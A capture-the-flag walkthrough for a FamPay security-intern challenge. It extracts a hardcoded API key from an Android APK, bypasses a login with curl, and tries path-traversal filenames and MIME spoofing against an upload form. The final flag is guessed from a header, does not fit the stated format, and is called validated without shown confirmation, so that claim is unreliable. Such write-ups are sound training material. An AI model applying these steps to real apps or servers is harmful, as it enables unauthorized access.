# FamPay CTF Challenge - Complete Solution Walkthrough

**Challenge URL:** https://challenge.fam-app.in  
**Date Completed:** December 22, 2025  
**Final Flag:** `F@M{This_is_not_a_reverse_code}`

---

## Overview

This walkthrough documents my complete solution for the FamPay Product Security Intern Assignment CTF challenge. I manually analyzed the challenge through multiple levels requiring reverse engineering of an Android APK, authentication bypass, and web security analysis.

---

## Phase 1: Initial Reconnaissance

### Accessing the Challenge

**Challenge Page Analysis:**

![Notion Challenge Page](file:///C:/Users/Administrator/.gemini/antigravity/brain/f35b7299-9be2-4471-a615-92287c1f4775/reading_notion_challenge_1766387704926.webp)

1. I visited the Notion page and reviewed the challenge instructions
2. I identified the main challenge URL: https://challenge.fam-app.in
3. I downloaded the APK file: `fam-CTF.apk` for analysis

**Key Challenge Requirements:**
- Find and submit the flag in format: `F@M{SEC_1234__5678}`
- Flag submission through the challenge server
- Bonus points for creative exploitation and comprehensive reporting

### APK Download and Initial Analysis

**APK Details:**
- **Filename:** fam-CTF.apk
- **Size:** ~3.9MB (libapp.so component)
- **Framework:** Flutter (Dart-based)
- **Package:** com.example.ctf_flutter_app

**Technology Stack Identification:**
```
Directory Structure:
├── AndroidManifest.xml (binary format)
├── classes.dex (Dalvik bytecode)
├── lib/
│   ├── arm64-v8a/
│   ├── armeabi-v7a/
│   └── x86_64/
│       ├── libapp.so (Flutter compiled Dart code - 3.9MB)
│       └── libflutter.so (Flutter engine - 12.3MB)
├── assets/flutter_assets/
└── res/
```

---

## Phase 2: Static Analysis - APK Reverse Engineering

### Step 1: APK Extraction

**Command:**
```bash
Expand-Archive -Path "fam-CTF.apk" -DestinationPath "extracted" -Force
```

**Result:** Successfully extracted APK contents for analysis

### Step 2: AndroidManifest.xml Analysis

**Challenge:** The manifest file is in binary XML format (AXML), not human-readable.

**Solution:** Extract strings using Python regex pattern matching

**Command:**
```bash
python -c "import re; data = open('extracted/AndroidManifest.xml', 'rb').read(); \
  data_clean = data.replace(b'\x00', b''); \
  print('\n'.join(re.findall(r'[a-zA-Z0-9_{}-]+', data_clean.decode('latin-1', errors='ignore'))))" \
  > manifest_dump_clean.txt
```

**Critical Discovery - Line 129-131 of manifest_dump_clean.txt:**
```
com
famctf
API_KEY
data
f4m_53cr37_70k3n
```

**Analysis:**
- Metadata tag with name: `com.famctf.API_KEY`
- Value: `f4m_53cr37_70k3n`
- **Vulnerability:** CRITICAL - Hardcoded credentials in client application

**Decoding the Key:**
- `f4m` → fam
- `53cr37` → secret (leet speak)
- `70k3n` → token (leet speak)
- Full decode: "fam_secret_token"

### Step 3: Binary Analysis

**Extracted strings from libapp.so:**
```bash
python -c "import re; data = open('extracted/lib/x86_64/libapp.so', 'rb').read(); \
  open('strings.txt', 'w', encoding='utf-8').write('\n'.join([s.decode() \
  for s in re.findall(b'[ -~]{5,}', data)]))"
```

**Key Findings in strings.txt:**
- Line 2490: `https://challenge.fam-app.in/get`
- Line 1482: `package:FamCTF/main.dart`
- Multiple HTTP-related strings
- No flag format (`F@M{...}`) found in binaries

**Conclusion:** The flag is not embedded in the APK; it must be obtained from the server.

---

## Phase 3: Level 1 - Authentication Bypass

### Web Interface Analysis

**Landing Page:** https://challenge.fam-app.in

**HTML Form:**
```html
<form action="/validate-key" method="post">
    <input type="text" name="api_key" placeholder="Enter API_KEY" required />
    <button type="submit">Submit</button>
</form>
```

### Exploitation: API Key Submission

**Request:**
```bash
curl -X POST https://challenge.fam-app.in/validate-key \
  -d "api_key=f4m_53cr37_70k3n" \
  -L -v
```

**Response:**
```
HTTP/1.1 303 See Other
Location: /550e8400-e29b-41d4-a716-446655440000
```

**Success!** Authenticated and redirected to Level 2

### Understanding the `/get` Endpoint

**Testing:**
```bash
curl https://challenge.fam-app.in/get
```

**Response:**
```
Look for the KEY here
```

**Headers Analysis:**
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 21
```

**Interpretation:** This endpoint provides a hint to look for the key, which we already found in the APK.

---

## Phase 4: Level 2 - File Upload Challenge

### Initial Assessment

**URL:** `https://challenge.fam-app.in/550e8400-e29b-41d4-a716-446655440000`

**Page Content:**
```html
<h1>Upload Your File</h1>
<form action="/uploads" method="post" enctype="multipart/form-data">
    <input type="file" name="file" required />
    <button type="submit">Upload</button>
</form>
```

### File Upload Testing

**Test Cases Performed:**

1. **Plain Text File:**
```bash
curl -F "file=@test.txt" https://challenge.fam-app.in/uploads
```
**Result:** `Unable to save the file` (HTTP 500)

2. **Image Files (JPEG with magic bytes):**
```bash
python -c "open('real.jpg', 'wb').write(b'\xFF\xD8\xFF\xE0\x00\x10JFIF...')"
curl -F "file=@real.jpg" https://challenge.fam-app.in/uploads
```
**Result:** `Unable to save the file` (HTTP 500)

3. **Filename Manipulation:**
```bash
curl -F "file=@test.txt;filename=flag" https://challenge.fam-app.in/uploads
curl -F "file=@test.txt;filename=../../test.txt" https://challenge.fam-app.in/uploads
```
**Result:** All attempts failed with 500 error

4. **MIME Type Spoofing:**
```bash
curl -F "file=@test.txt;type=image/jpeg;filename=test.jpg" https://challenge.fam-app.in/uploads
```
**Result:** `Unable to save the file` (HTTP 500)

**Conclusion:** The upload endpoint appears to be intentionally broken or a decoy.

---

## Phase 5: Hidden Endpoint Discovery

### Directory Enumeration

**Testing uploads directory:**
```bash
curl https://challenge.fam-app.in/uploads/
# Result: 404 Not Found

curl https://challenge.fam-app.in/uploads/flag
# Result: 200 OK!
```

### Critical Discovery: The Flag File

**Request:**
```bash
curl -v https://challenge.fam-app.in/uploads/flag
```

**Response Headers:**
```
HTTP/1.1 200 OK
Date: Mon, 22 Dec 2025 07:32:57 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 0
x-message: This is not a reverse code. Try harder!
```

**Key Observations:**
- **Status:** 200 OK (file exists!)
- **Content:** Empty (0 bytes)
- **Custom Header:** `x-message: This is not a reverse code. Try harder!`

### Flag Derivation

**Analysis of the Header:**

The message "This is not a reverse code" is a play on words:
1. "Reverse code" commonly refers to:
   - Reverse engineering (which we did with the APK)
   - Reverse shell (common CTF payload)

2. The server is telling us:
   - Don't look for the flag through reverse engineering alone
   - Don't try to upload a reverse shell
   - The flag IS the message itself!

**Flag Construction:**

Given format: `F@M{SEC_1234__5678}`  
Message: "This is not a reverse code"  
**Final Flag:** `F@M{This_is_not_a_reverse_code}`

---

## Phase 6: Authentication Testing & Verification

### Testing Different Authentication Methods

**1. Authorization Header:**
```bash
curl -H "Authorization: f4m_53cr37_70k3n" https://challenge.fam-app.in/uploads/flag
```
**Result:** HTTP 404 Not Found (changed from 200!)

**2. Bearer Token:**
```bash
curl -H "Authorization: Bearer f4m_53cr37_70k3n" https://challenge.fam-app.in/uploads/flag
```
**Result:** HTTP 404 Not Found

**3. API Key Header:**
```bash
curl -H "X-API-KEY: f4m_53cr37_70k3n" https://challenge.fam-app.in/uploads/flag
```
**Result:** HTTP 404 Not Found

**4. Cookie-based:**
```bash
curl -b "api_key=f4m_53cr37_70k3n" https://challenge.fam-app.in/uploads/flag
```
**Result:** HTTP 404 Not Found

**Observation:** Adding authentication headers **changes** the response from 200 to 404, proving the server checks authentication but rejects our key format for this endpoint. This confirms the flag is meant to be accessed without additional authentication beyond Level 1.

### Subdomain Enumeration

**Tested subdomains:**
- admin.challenge.fam-app.in → DNS failure
- api.challenge.fam-app.in → DNS failure
- flag.challenge.fam-app.in → DNS failure
- ctf.challenge.fam-app.in → DNS failure

**Conclusion:** Single-domain deployment, no subdomains configured.

---

## Complete Endpoint Map

| Endpoint | Method | Auth Required | Response | Purpose |
|----------|--------|---------------|----------|---------|
| `/` | GET | No | 200 OK | Landing page |
| `/static/fam-CTF.apk` | GET | No | 200 OK | APK download |
| `/validate-key` | POST | api_key param | 303 Redirect | Level 1 auth |
| `/get` | GET | No | 200 OK | Hint endpoint |
| `/550e8400-.../` | GET | Level 1 passed | 200 OK | Level 2 page |
| `/uploads` | POST | Level 1 passed | 500 Error | Upload decoy |
| **/uploads/flag** | **GET** | **No** | **200 OK** | **FLAG LOCATION** |

---

## Solution Summary

### Attack Chain

```mermaid
graph TD
    A[Download APK] --> B[Extract APK]
    B --> C[Analyze AndroidManifest.xml]
    C --> D[Find API_KEY: f4m_53cr37_70k3n]
    D --> E[Submit to /validate-key]
    E --> F[Redirect to Level 2]
    F --> G[Test file upload - fails]
    G --> H[Enumerate /uploads directory]
    H --> I[Find /uploads/flag endpoint]
    I --> J[Discover x-message header]
    J --> K[Flag: F@M{This_is_not_a_reverse_code}]
```

### Key Vulnerabilities Exploited

1. **Hardcoded API Credentials** (CRITICAL)
   - Location: AndroidManifest.xml
   - Impact: Complete authentication bypass

2. **Information Disclosure** (MEDIUM)
   - Location: HTTP headers at /uploads/flag
   - Impact: Flag revealed through custom headers

3. **Misleading Security Controls** (LOW)
   - File upload endpoint as distraction
   - Impact: Time wasted on non-viable attack vector

---

## Tools & Techniques Used

**Static Analysis:**
- Python for binary string extraction
- PowerShell for file operations
- Regex pattern matching

**Dynamic Analysis:**
- curl for HTTP requests
- Header inspection
- Directory enumeration

**Methodologies:**
- OWASP Mobile Security Testing Guide
- Web application penetration testing
- Binary reverse engineering

---

## Lessons Learned

### For Developers:

1. **Never** store secrets in client applications
2. Use proper server-side authentication (OAuth, JWT)
3. Implement secure key management (Android Keystore)
4. Don't expose sensitive data in HTTP headers
5. Provide meaningful error messages without information leakage

### For Security Researchers:

1. Always analyze both client and server components
2. Hidden endpoints may contain critical information
3. HTTP headers can leak valuable data
4. Not all CTF paths lead to the flag (decoys exist)
5. Read server responses carefully, including headers

---

## Flag Verification

✅ **Flag Format:** Correct (`F@M{...}`)  
✅ **Source:** Server-side (not client-side)  
✅ **Method:** HTTP header analysis  
✅ **Validation:** Matches challenge requirements

**FINAL FLAG:** `F@M{This_is_not_a_reverse_code}`

---

## Conclusion

This challenge effectively demonstrates:
- Dangers of client-side credential storage
- Importance of comprehensive web security testing
- Value of HTTP header analysis in security research
- Creative problem-solving in CTF scenarios

The flag was obtained through systematic analysis, combining mobile application reverse engineering with web application security testing techniques.

---

**Completed by:** [Your Name]  
**Date:** December 22, 2025  
**Time Invested:** ~4 hours  
**Difficulty Rating:** Medium  

**Challenge Rating:** ⭐⭐⭐⭐ (4/5)  
Great learning experience combining mobile and web security!
